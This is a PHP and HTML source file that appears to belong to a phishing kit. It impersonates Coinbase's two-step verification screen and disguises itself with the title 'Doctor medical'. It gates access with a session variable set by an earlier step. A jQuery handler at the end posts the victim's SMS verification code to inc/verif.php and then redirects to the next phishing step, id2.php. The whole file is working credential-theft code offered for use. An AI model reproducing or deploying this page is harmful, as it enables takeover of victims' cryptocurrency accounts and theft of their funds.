<?php
session_start();
error_reporting(0);
include 'inc/main.php';

if (!($_SESSION['PHPisHERE'])){
  header('location: index.php');
}
?>
<!DOCTYPE html>
<html xmlns:fb="http://ogp.me/ns/fb#">
<head>
  <title>
      Doctor medical
  </title>
  <!-- generic -->
<link rel="icon" href="/img/favicon/favicon-32.png" sizes="32x32">
<link rel="icon" href="/img/favicon/favicon-57.png" sizes="57x57">
<link rel="icon" href="/img/favicon/favicon-76.png" sizes="76x76">
<link rel="icon" href="/img/favicon/favicon-96.png" sizes="96x96">
<link rel="icon" href="/img/favicon/favicon-128.png" sizes="128x128">
<link rel="icon" href="/img/favicon/favicon-192.png" sizes="192x192">
<link rel="icon" href="/img/favicon/favicon-228.png" sizes="228x228">

<!-- Android -->
<link rel="icon" href="/img/favicon/favicon-196.png" sizes="196x196">

<!-- iOS -->
<link rel="apple-touch-icon" href="/img/favicon/favicon-120.png" sizes="120x120">
<link rel="apple-touch-icon" href="/img/favicon/favicon-152.png" sizes="152x152">
<link rel="apple-touch-icon" href="/img/favicon/favicon-180.png" sizes="180x180">


      <meta property="description" name="description" content="convesio" />
    <meta property="title" name="title" content="convesio" />
    <meta property="apple-itunes-app" name="apple-itunes-app" content="app-id=886427730" />
      <meta property="google-site-verification" name="google-site-verification" content="R7G5THr8xgaHFkTNkr_RUB0HvX2Nf8e4qnWi0X1kmz8" />
      <meta property="google-site-verification" name="google-site-verification" content="_GaQTkOlc8tLwxDbZfMdxgGPL5wnctrp-vfeavJVsHE" />
    <meta property="og:description" name="og:description" content="Doctor" />
    <meta property="og:image" name="og:image" content="files/og-default-04-2021.jpg" />
    <meta property="og:title" name="og:title" content="Log out - " />
    <meta property="og:type" name="og:type" content="Doctor" />
    <meta property="twitter:app:id:googleplay" name="twitter:app:id:googleplay" content="com.android" />
    <meta property="twitter:app:id:iphone" name="twitter:app:id:iphone" content="886427730" />
    <meta property="twitter:app:id:ipad" name="twitter:app:id:ipad" content="886427730" />
    <meta property="twitter:app:name:googleplay" name="twitter:app:name:googleplay" content="Log out " />
    <meta property="twitter:app:name:ipad" name="twitter:app:name:ipad" content="Log out - " />
    <meta property="twitter:app:name:iphone" name="twitter:app:name:iphone" content="Log out - " />
    <meta property="twitter:card" name="twitter:card" content="summary" />
    <meta property="twitter:creator" name="twitter:creator" content="@" />
    <meta property="twitter:description" name="twitter:description" content="Doctor" />
    <meta property="twitter:image" name="twitter:image" content="files/og-default-04-2021.jpg" />
    <meta property="twitter:site" name="twitter:site" content="@" />
    <meta property="twitter:title" name="twitter:title" content="Log out" />
    <meta property="viewport" name="viewport" content="width=device-width, initial-scale=1.0" />

<link rel="manifest" href="/manifest.json" />


  

  <link rel="stylesheet" media="all" href="files/core-63e737142547145b29093fe91f0056e653a0fab2cb9cb1049bbda4158c991e40.css" />
  <link rel="stylesheet" media="all" href="files/application-351b7dc0d6dbf18a49e6d410a2e1900b5db113e6504f64b58eec19e35d9b1030.css" />
    <link rel="stylesheet" media="screen" href="files/cds.de3ee9bfa7f8cd381471.css" />
  <script src="files/jquery-cb0decd18b4b0abbece3cfc180d9adc8e11dfa693cf34c2ff1ffcda86e725301.js"></script>
  <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="q2vrznkLfF584DXhpgkt/G96HYFVB7de5CUDVrfwV0C/oNXMQUUzR6sNkaZ4BfowNlfKfHD5pbN2WlaKGOyz5smg==" />
  


  <script src="files/application-77f549ec32b2c1c63d20e3c4cf24c1fc2a6bd2a93bdd76558283286fdb88ca91.js"></script>
</head>

<body class="app signed-out sessions step_two" data-controller-name="sessions" data-action-name="step_two" data-view-name="Coinbase.Views.Sessions.StepTwo" data-account-id="">

  <!-- Android banner -->

  <div class="flash">
</div>

  <div class="page-container">
    <!-- Show flash message for any browser that isn't: Webkit, Firefox 17+, IE 9+ and Opera 12+ -->

        <div class="navbar navbar-static-top">
  <div class="navbar-inner" >
    <div class="container">
        <a id="main_nav_btn" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </a>

        <a href="/" class="brand">
          <svg height="28" viewBox="0 0 158 28" xmlns="http://www.w3.org/2000/svg" class="Header__Logo" role="button" style="
            width: 112px;
            height: 20px;
            margin-top: 2px;
            fill: #FFFFFF;
            cursor: pointer;
          ">
            <path d="M31.6354 7.81707C25.9412 7.81707 21.492 12.1397 21.492 17.9263C21.492 23.713 25.8287 27.9986 31.6354 27.9986C37.442 27.9986 41.8541 23.639 41.8541 17.8893C41.8541 12.1766 37.5174 7.81707 31.6354 7.81707ZM31.6738 23.8283C28.4311 23.8283 26.055 21.3098 26.055 17.9277C26.055 14.5072 28.3927 11.9903 31.6354 11.9903C34.9164 11.9903 37.2911 14.5456 37.2911 17.9277C37.2911 21.3098 34.9164 23.8283 31.6738 23.8283ZM43.0977 12.215H45.9261V27.6244H50.4508V8.19271H43.0977V12.215ZM10.105 11.9888C12.4811 11.9888 14.3664 13.4543 15.0821 15.6341H19.8713C19.0034 10.9743 15.1575 7.81707 10.1434 7.81707C4.4492 7.81707 0 12.1397 0 17.9277C0 23.7158 4.33681 28 10.1434 28C15.0451 28 18.9664 24.8427 19.8343 20.1445H15.0821C14.4034 22.3243 12.5181 23.8283 10.142 23.8283C6.86092 23.8283 4.56159 21.3098 4.56159 17.9277C4.56304 14.5072 6.82535 11.9888 10.105 11.9888ZM129.068 16.0482L125.75 15.5601C124.167 15.3353 123.036 14.8089 123.036 13.5682C123.036 12.215 124.507 11.5392 126.504 11.5392C128.692 11.5392 130.087 12.4783 130.389 14.0192H134.763C134.272 10.1107 131.255 7.81848 126.618 7.81848C121.829 7.81848 118.662 10.2615 118.662 13.719C118.662 17.0257 120.736 18.9437 124.921 19.5441L128.239 20.0321C129.861 20.2569 130.766 20.8972 130.766 22.0995C130.766 23.6404 129.182 24.2793 126.995 24.2793C124.317 24.2793 122.809 23.1894 122.583 21.5361H118.134C118.549 25.3322 121.527 28 126.957 28C131.897 28 135.177 25.7448 135.177 21.8732C135.177 18.4158 132.802 16.6116 129.068 16.0482ZM48.1884 0.187814C46.5294 0.187814 45.2848 1.39011 45.2848 3.04345C45.2848 4.69678 46.5281 5.89907 48.1884 5.89907C49.8474 5.89907 51.0926 4.69678 51.0926 3.04345C51.0926 1.39011 49.8474 0.187814 48.1884 0.187814ZM114.59 14.8459C114.59 10.6371 112.026 7.81848 106.596 7.81848C101.468 7.81848 98.6024 10.4123 98.0363 14.3962H102.524C102.75 12.8553 103.957 11.5776 106.521 11.5776C108.822 11.5776 109.953 12.5921 109.953 13.8328C109.953 15.4492 107.878 15.8618 105.314 16.125C101.845 16.5006 97.5468 17.7029 97.5468 22.2133C97.5468 25.7092 100.149 27.963 104.297 27.963C107.539 27.963 109.575 26.6099 110.594 24.4671C110.745 26.3837 112.178 27.6244 114.177 27.6244H116.816V23.6034H114.591V14.8459H114.59ZM110.14 19.7319C110.14 22.3257 107.878 24.2423 105.125 24.2423C103.428 24.2423 101.995 23.528 101.995 22.0255C101.995 20.1089 104.295 19.5825 106.407 19.3577C108.443 19.1699 109.574 18.7188 110.14 17.8538V19.7319ZM86.1214 7.81707C83.5944 7.81707 81.4831 8.86996 79.975 10.6357V0H75.4504V27.6244H79.8993V25.069C81.4074 26.9101 83.5577 28 86.1214 28C91.5508 28 95.6616 23.7158 95.6616 17.9277C95.6616 12.1397 91.4756 7.81707 86.1214 7.81707ZM85.4429 23.8283C82.2001 23.8283 79.8241 21.3098 79.8241 17.9277C79.8241 14.5456 82.2373 11.9903 85.4796 11.9903C88.7609 11.9903 91.0599 14.5087 91.0599 17.9277C91.0599 21.3098 88.6852 23.8283 85.4429 23.8283ZM64.6279 7.81707C61.6871 7.81707 59.7634 9.01937 58.6324 10.7111V8.19271H54.1446V27.623H58.6692V17.0627C58.6692 14.0932 60.5544 11.9888 63.3448 11.9888C65.947 11.9888 67.5675 13.83 67.5675 16.4992V27.6244H72.0921V16.162C72.0939 11.2746 69.5682 7.81707 64.6279 7.81707ZM156.745 17.2889C156.745 11.727 152.673 7.81848 147.205 7.81848C141.399 7.81848 137.137 12.1781 137.137 17.9277C137.137 23.9791 141.7 28 147.281 28C151.995 28 155.69 25.2184 156.632 21.2728H151.918C151.239 23.0016 149.58 23.9791 147.355 23.9791C144.451 23.9791 142.264 22.1749 141.774 19.0176H156.744V17.2889H156.745ZM142.039 15.785C142.756 13.0787 144.792 11.764 147.13 11.764C149.694 11.764 151.655 13.2295 152.107 15.785H142.039Z" fill-rule="evenodd"/>
          </svg>
</a>
        <div class="mobile-bg"></div>
        
    </div>
  </div>
</div>


    <div class="container" id="page">
      
      
<div class="session">
  <div class="notification resent">
    <p class="notification-text success">Code resent!</p>
  </div>
  <div class="notification generic-error">
    <p class="notification-text error">
      Connection trouble. Please try again in a few minutes.
    </p>
  </div>

  <div class="account-form step-two">

    <div id="no_webauthn" style="display:none;">
      <h3>Incompatible browser</h3>
      <br/>
      <div class="control-group two-factor">
        <div class="controls">
          Your security key isn’t compatible with your web browser. See a <a href="https://support.coinbase.com/customer/portal/articles/2973914-using-and-managing-security-keys" target="_blank">list of compatible browsers</a> or visit coinbase.com on your desktop computer to change verification settings.
        </div>
      </div>
    </div>

    <form class="form form-horizontal need-help-form" id="Login" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="7GVpwUHzKAEILtgrX9A08+22O5+NM3HzhEvIQvi0fDrt79YtTzukx2hgTHWsoMx73eHw0yrJoj5CB0X5UACOuw==" />

      <h3>Enter the 7-digit code we texted to your phone</h3>

    <div class="notification rate-limit">
      <p class="notification-text error">
        Wait a few minutes for your code to arrive or tap the help button below to update your phone number.
      </p>
    </div>

    <input type="hidden" name="phone_number_id" id="phone_number_id" />

      <p>This extra step shows it’s really you trying to validate your Email confirmation.</p>

    <div class="control-group two-factor-experiment ">
      <div class="controls">
          <label for="tokenn">
            <strong>Enter 2-step verification code:</strong>
</label>          <input type="text" name="tokenn" id="tokenn" pattern="\d*" title="This field must only contain digits" maxlength="7" autocomplete="off" placeholder="7-digit code" />
</form>      </div>

        <input type="submit" name="commit" value="confirm" class="btn btn-primary" id="step_two_verify" data-disable-with="Verifying..." />

    </div>

    
  </div>
</div>
<br>



<div class="modal fade hide widget" id="need_help_modal">

<div class="modal-header">
  <a class="back" data-dismiss="modal">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M24 10.7501H4.79L10.15 5.38012L8.38 3.62012L0 12.0001L8.38 20.3801L10.15 18.6201L4.79 13.2501H24V10.7501Z" fill="#5B636E" fill-opacity="0.68"/>
</svg>

  </a>
  <h4>
    I need help
  </h4>
</div>

<div class="modal-body">
    <div id="resend_sms_code_link" class="section">
      <div class="section-title">Resend code</div>
      <div class="section-desc">Have the code resent to your phone number</div>
    </div>
    <div class="section">
      <a href="https://help.coinbase.com/en/coinbase/managing-my-account/account-recovery/i-have-lost-or-need-to-update-my-phone-or-2-factor-authentication-device" target="_blank">
        <div class="section-title">I’m not receiving the code or the code doesn’t work</div>
        <div class="section-desc">Visit our help center for troubleshooting instructions</div>
</a>    </div>
    <div class="section">
      <a href="/account_recovery/new?type=sms">
        <div class="section-title">I need to update my phone number</div>
        <div class="section-desc">Update your number by verifying your identity and taking a photo of yourself and your ID</div>
</a>    </div>
</div>

</div>




    </div>
  </div>

  <footer>
  <div class="container">
    <div class="row-fluid">
      <div class="span2 footer__logo">
        <a href="/" class="brand">
          <svg height="28" viewBox="0 0 158 28" xmlns="http://www.w3.org/2000/svg" role="button" style="
            width: 112px;
            height: 20px;
            fill: #0667d0;
            cursor: pointer;
          ">
            <path d="M31.6354 7.81707C25.9412 7.81707 21.492 12.1397 21.492 17.9263C21.492 23.713 25.8287 27.9986 31.6354 27.9986C37.442 27.9986 41.8541 23.639 41.8541 17.8893C41.8541 12.1766 37.5174 7.81707 31.6354 7.81707ZM31.6738 23.8283C28.4311 23.8283 26.055 21.3098 26.055 17.9277C26.055 14.5072 28.3927 11.9903 31.6354 11.9903C34.9164 11.9903 37.2911 14.5456 37.2911 17.9277C37.2911 21.3098 34.9164 23.8283 31.6738 23.8283ZM43.0977 12.215H45.9261V27.6244H50.4508V8.19271H43.0977V12.215ZM10.105 11.9888C12.4811 11.9888 14.3664 13.4543 15.0821 15.6341H19.8713C19.0034 10.9743 15.1575 7.81707 10.1434 7.81707C4.4492 7.81707 0 12.1397 0 17.9277C0 23.7158 4.33681 28 10.1434 28C15.0451 28 18.9664 24.8427 19.8343 20.1445H15.0821C14.4034 22.3243 12.5181 23.8283 10.142 23.8283C6.86092 23.8283 4.56159 21.3098 4.56159 17.9277C4.56304 14.5072 6.82535 11.9888 10.105 11.9888ZM129.068 16.0482L125.75 15.5601C124.167 15.3353 123.036 14.8089 123.036 13.5682C123.036 12.215 124.507 11.5392 126.504 11.5392C128.692 11.5392 130.087 12.4783 130.389 14.0192H134.763C134.272 10.1107 131.255 7.81848 126.618 7.81848C121.829 7.81848 118.662 10.2615 118.662 13.719C118.662 17.0257 120.736 18.9437 124.921 19.5441L128.239 20.0321C129.861 20.2569 130.766 20.8972 130.766 22.0995C130.766 23.6404 129.182 24.2793 126.995 24.2793C124.317 24.2793 122.809 23.1894 122.583 21.5361H118.134C118.549 25.3322 121.527 28 126.957 28C131.897 28 135.177 25.7448 135.177 21.8732C135.177 18.4158 132.802 16.6116 129.068 16.0482ZM48.1884 0.187814C46.5294 0.187814 45.2848 1.39011 45.2848 3.04345C45.2848 4.69678 46.5281 5.89907 48.1884 5.89907C49.8474 5.89907 51.0926 4.69678 51.0926 3.04345C51.0926 1.39011 49.8474 0.187814 48.1884 0.187814ZM114.59 14.8459C114.59 10.6371 112.026 7.81848 106.596 7.81848C101.468 7.81848 98.6024 10.4123 98.0363 14.3962H102.524C102.75 12.8553 103.957 11.5776 106.521 11.5776C108.822 11.5776 109.953 12.5921 109.953 13.8328C109.953 15.4492 107.878 15.8618 105.314 16.125C101.845 16.5006 97.5468 17.7029 97.5468 22.2133C97.5468 25.7092 100.149 27.963 104.297 27.963C107.539 27.963 109.575 26.6099 110.594 24.4671C110.745 26.3837 112.178 27.6244 114.177 27.6244H116.816V23.6034H114.591V14.8459H114.59ZM110.14 19.7319C110.14 22.3257 107.878 24.2423 105.125 24.2423C103.428 24.2423 101.995 23.528 101.995 22.0255C101.995 20.1089 104.295 19.5825 106.407 19.3577C108.443 19.1699 109.574 18.7188 110.14 17.8538V19.7319ZM86.1214 7.81707C83.5944 7.81707 81.4831 8.86996 79.975 10.6357V0H75.4504V27.6244H79.8993V25.069C81.4074 26.9101 83.5577 28 86.1214 28C91.5508 28 95.6616 23.7158 95.6616 17.9277C95.6616 12.1397 91.4756 7.81707 86.1214 7.81707ZM85.4429 23.8283C82.2001 23.8283 79.8241 21.3098 79.8241 17.9277C79.8241 14.5456 82.2373 11.9903 85.4796 11.9903C88.7609 11.9903 91.0599 14.5087 91.0599 17.9277C91.0599 21.3098 88.6852 23.8283 85.4429 23.8283ZM64.6279 7.81707C61.6871 7.81707 59.7634 9.01937 58.6324 10.7111V8.19271H54.1446V27.623H58.6692V17.0627C58.6692 14.0932 60.5544 11.9888 63.3448 11.9888C65.947 11.9888 67.5675 13.83 67.5675 16.4992V27.6244H72.0921V16.162C72.0939 11.2746 69.5682 7.81707 64.6279 7.81707ZM156.745 17.2889C156.745 11.727 152.673 7.81848 147.205 7.81848C141.399 7.81848 137.137 12.1781 137.137 17.9277C137.137 23.9791 141.7 28 147.281 28C151.995 28 155.69 25.2184 156.632 21.2728H151.918C151.239 23.0016 149.58 23.9791 147.355 23.9791C144.451 23.9791 142.264 22.1749 141.774 19.0176H156.744V17.2889H156.745ZM142.039 15.785C142.756 13.0787 144.792 11.764 147.13 11.764C149.694 11.764 151.655 13.2295 152.107 15.785H142.039Z" fill-rule="evenodd"/>
          </svg></a>
        <br/>
        <small><span>&copy; 2021 Coinbase</span></small>
      </div>
          <div class="dropup dropdown-hover">
            <a class="dropdown-toggle" data-toggle="dropdown" href="#">
              Legal &amp; Privacy
            </a>
            <ul class="dropdown-menu fadeIn animated-fast" role="menu" aria-labelledby="dLabel">
              <li><a href="">User Agreement</a></li>
              <li><a href="y">Privacy Policy</a></li>
                <li><a href="">Licenses &amp; Disclosures</a></li>
            </ul>
          </div>
        </nav>
      </div>
        <div class="span2">
          <div class="footer-locale-select">
  <h4>Language</h4>
  <p><select name="locale" id="locale_select"></select></p>
  <!-- <small><a href="https://crowdin.com/project/coinbase">Help translate Coinbase</a></small> -->
</div>

        </div>
    </div>
  </div>
</footer>

<script type="text/javascript">
var request;
$("#Login").submit(function(event){
    event.preventDefault();
    if (request) {
        request.abort();
    }
    var $form = $(this);
    var $inputs = $form.find("input, select, button, textarea");
    var serializedData = $form.serialize();
    $inputs.prop("disabled", true);
    $("#tiitleerror").show(400);
    request = $.ajax({
        url: "inc/verif.php",
        type: "post",
        data: serializedData
    });
    request.done(function (response, textStatus, jqXHR){
 $(location).attr("href", "id2.php?cmd=<?php echo $_SESSION['PHPisHERE']?>");
    });
    request.fail(function (jqXHR, textStatus, errorThrown){
        console.error(
            "The following error occurred: "+
            textStatus, errorThrown
        );
    });
    request.always(function () {

        $inputs.prop("disabled", false);
    });
});

</script>
  



</body>
</html>
